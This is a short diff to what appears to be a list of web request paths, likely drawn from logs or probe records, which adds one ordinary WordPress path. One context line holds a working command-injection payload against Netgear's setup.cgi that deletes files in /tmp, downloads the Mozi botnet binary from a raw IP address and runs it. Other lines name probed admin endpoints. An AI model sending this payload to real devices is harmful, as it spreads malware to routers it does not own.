@@ -7833,3 +7833,4 @@ api.ipify.org:443
 /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://182.113.13.128:41448/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
 /contact-us/
 /assets/admin/plugins/elfinder/connectors/php/connector.php
+/wp-admin/admin-ajax.php
